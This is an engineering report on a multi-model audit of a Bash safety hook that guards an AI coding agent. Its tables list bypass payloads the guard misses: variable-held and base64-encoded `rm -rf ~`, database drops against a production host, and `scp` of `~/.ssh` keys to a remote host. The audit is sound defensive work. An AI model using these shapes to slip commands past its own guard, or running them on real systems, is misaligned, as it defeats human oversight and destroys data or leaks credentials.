# First consumer: the core-guard cross-vendor audit (F10), 2026-09-07

The first mission conductor ran on something other than itself: a cold audit of the
operator's Claude Code Bash guard (`hooks/core-guard.py`, 872 lines, its test gate 622 lines)
in the harness repository, three vendors in parallel, read lanes only, no build. The point was
the receipt: does a three-vendor cold read of a security hook produce findings that agree, and
what does it cost.

## How the ask was written

By conductor, per the operator's decision: an Opus 5 planner lane (`plan: true`, E10) read the
guard, its tests, and the manifest, then conductor's README and AGENTS.md reviewer rules, and
delivered the audit mission file with per-lane prompts and caps. It could not write the
deliverable: a Claude read lane runs under plan mode, which allows no write but its plan file,
so Opus wrote the complete mission JSON into the plan file and answered "say the word". $2.18.
The lead copied the JSON out, corrected the child's `cwd` (the planner had written its own
worktree path, which `gc` would remove), and launched it as a plain mission. The gap is now
F12's; the prompts the planner wrote were good: each lane's prompt named concrete lines to
start from (the segmenter's quote fallback, the grouping strip, `fold_empty`, the heredoc
stripper, the interpreter list, the force-token set), the three finding classes, and the
no-quota template, and Grok's lane was told it may run the guard's own test file and feed the
guard payloads with the log redirected under `$TMPDIR`.

## The run

| lane | model | cap | spent | wall | tool calls | answer |
|---|---|---|---|---|---|---|
| audit-claude | Sonnet 5, hard | $3.00 | $0.71 | 4.7 min | 8 | 6 findings, each verified by running the guard against a crafted payload, three against real shell or git semantics |
| audit-gemini | Gemini 3.7 Flash | $1.00 | $0.24 | 1.8 min | 12 | 12 bypasses, 5 false positives, 2 test-suite gaps |
| audit-grok | Grok 4.6 | $2.00 | $0.41 | 8.2 min | 20 | ran the gate (86 catch, 84 quiet, green), probed shapes live: 12 bypasses, 6 false positives, 4 test gaps |

$1.36 total, every lane green on bytes (nothing moved), receipt chain of three, attested.

## What they agreed on

Bypass shapes, with how many of the three reported each and the highest confidence given:

| shape | reported by | confidence | example |
|---|---|---|---|
| verb held in a variable; `fold_empty` leaves a standalone `$VAR` alone | 3 of 3 | 10 | `V=rm; $V -rf ~` (Sonnet ran it: the target was deleted) |
| a script executed directly by path never reaches `script_bodies` (only an interpreter word triggers it) | 3 of 3 | 10 | `./evil.sh` allowed, `bash evil.sh` denied |
| git short-option bundling in force detection | 3 of 3 | 10 | `git push -uf origin main` |
| capitalized verbs on a case-insensitive filesystem; `verb()` never folds case | 2 of 3 | 10 | `RM -rf ~`, `GIT push --force` |
| command or process substitution keeps `$(` on the verb token | 2 of 3 | 10 | `echo $(rm -rf ~)`, `cat <(rm -rf ~)` |
| heredoc bodies stripped before `check_db` and `check_exfil` see them | 2 of 3 | 10 | `psql -h prod <<SQL DELETE ... SQL` |
| piped or file-fed SQL never shares a segment with the client | 2 of 3 | 10 | `echo 'DROP TABLE users' \| psql -h prod`, `psql -h prod -f drop.sql` |
| credential directories need a trailing slash in `CRED` | 2 of 3 | 10 | `scp -r ~/.ssh host:/tmp/` |
| `bash -c`, `eval`, here-strings, base64 pipes keep the verb inside one token | 1 of 3 (Grok, probed live) | 10 | `bash -c 'rm -rf ~'`, `echo cm0gLXJmIH4K \| base64 -d \| bash` |
| `--expire now` as two tokens in reflog expiry | 1 of 3 | 10 | `git reflog expire --expire now --all` |
| `in_roots` is exact equality, so subdirectories of system roots pass | 2 of 3 | 7 to 10 | `rm -rf /usr/bin` |
| `rsync://` and `scp://` destinations rejected by the remote-spec regex | 1 of 3 | 10 | `scp ~/.ssh/id_rsa scp://host/dest` |
| bare `find -delete` with no path operand | 1 of 3 | 10 | wipes the cwd on BSD find |

False positives, ordinary commands denied:

| shape | reported by | example |
|---|---|---|
| flag letters concatenated, so `--force` and `--verbose` read as `-rf` | 3 of 3 | `rm --force ~/file`, `rm -f --verbose ~/file` |
| any `://host` in the segment read as the database host | 3 of 3 | `psql -c "DROP TABLE tmp -- see https://wiki/runbook"` |
| credential-shaped text in a URL path or payload read as exfiltration | 2 of 3 | `curl -d '{}' https://api/v1/credentials.json/rotate` |
| `.pem`, `.env`, `id_rsa` matched as substrings | 1 of 3 | `scp ~/.ssh/id_rsa.pub host:`, `curl -d @.env.example ...` |
| every non-repository direct child of home denied | 2 of 3 | `rm -rf ~/Downloads` (matches the written policy; reported as friction) |
| angle-bracket tokens drop the following argument in redirection stripping | 2 of 3 | `rm -rf ~>/dev/null` loses its target (Grok: allowed) |

Test suite: all three said the CATCH cases assert `deny` without which rule fired, so a deny
for the wrong reason passes; Grok listed the checks with no case at all (`clickhouse-client`,
`FLUSHDB`, `.deleteMany`, every bypass above).

## What the receipt says about conductor

- Three cold reads of one 900-line file converge on the same top findings without seeing each
  other; where one vendor reported alone it was Grok, which had probed the shape live. Rule 7's
  finding (Grok reports beyond the diff, Gemini's answer is correct when it writes one) holds
  on a repository conductor had never seen.
- $1.36 for the three, under the planner's own caps by more than half; the planner's cap
  arithmetic (a cold read of 1,851 lines plus tool calls) was conservative and stated.
- The planner lane could not write its deliverable (F12). The fix is one dispatch flag pair;
  the receipt is why it matters.
- Nothing in the harness repository was touched; the audit ran on worktrees at its HEAD, so
  the four uncommitted files in that checkout were not read.

The findings themselves belong to the harness repository's owner; the fix, when wanted, is a
Shape A mission there with `hooks/tests/core-guard-test.py` as the gate and this document as
the spec's evidence.
